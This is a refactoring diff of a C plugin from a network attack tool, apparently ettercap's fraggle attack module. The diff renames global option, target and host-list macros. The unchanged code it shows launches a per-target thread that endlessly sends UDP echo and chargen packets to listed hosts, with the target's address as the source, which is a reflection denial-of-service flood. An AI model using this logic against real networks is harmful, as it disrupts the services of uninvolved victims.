@@ -48,31 +48,31 @@ static int fraggle_attack_init(void *dummy)
 
    DEBUG_MSG("fraggle_attack_init");
 
-   if(GBL_OPTIONS->unoffensive) {
+   if(EC_GBL_OPTIONS->unoffensive) {
       INSTANT_USER_MSG("fraggle_attack: plugin doesn't work in unoffensive mode.\n");
       return PLUGIN_FINISHED;
    }
 
-   if(GBL_TARGET1->all_ip && GBL_TARGET1->all_ip6) {
+   if(EC_GBL_TARGET1->all_ip && EC_GBL_TARGET1->all_ip6) {
       USER_MSG("Add at least one host to target one list.\n");
       return PLUGIN_FINISHED;
    }
 
-   if(LIST_EMPTY(&GBL_HOSTLIST)) {
+   if(LIST_EMPTY(&EC_GBL_HOSTLIST)) {
       USER_MSG("Global host list is empty.\n");
       return PLUGIN_FINISHED;
    }
 
-   GBL_OPTIONS->quiet = 1;
+   EC_GBL_OPTIONS->quiet = 1;
    INSTANT_USER_MSG("fraggle_attack: starting fraggle attack against hosts of target one.\n");
 
    /* (IPv4) creating a thread per target 1 */
-   LIST_FOREACH(i, &GBL_TARGET1->ips, next) {
+   LIST_FOREACH(i, &EC_GBL_TARGET1->ips, next) {
       ec_thread_new("fraggler", "thread performing a fraggle attack", &fraggler, &i->ip);
    }
 
    /*(IPv6) creating a thread per target 1 */
-   LIST_FOREACH(i, &GBL_TARGET1->ip6, next) {
+   LIST_FOREACH(i, &EC_GBL_TARGET1->ip6, next) {
       ec_thread_new("fraggler", "thread performing a fraggle attack", &fraggler, &i->ip);
    }
 
@@ -121,13 +121,13 @@ static EC_THREAD_FUNC(fraggler)
    LOOP {
       CANCELLATION_POINT();
 
-      LIST_FOREACH_SAFE(h, &GBL_HOSTLIST, next, htmp)
+      LIST_FOREACH_SAFE(h, &EC_GBL_HOSTLIST, next, htmp)
       	  if(ntohs(h->ip.addr_type) == proto) {
             	send_udp(ip, &h->ip, h->mac, port_echo, port_echo, payload, length);
             	send_udp(ip, &h->ip, h->mac, port_chargen, port_chargen, payload, length);
             }
 
-      ec_usleep(1000*1000/GBL_CONF->sampling_rate);
+      ec_usleep(1000*1000/EC_GBL_CONF->sampling_rate);
    }
 
    return NULL;
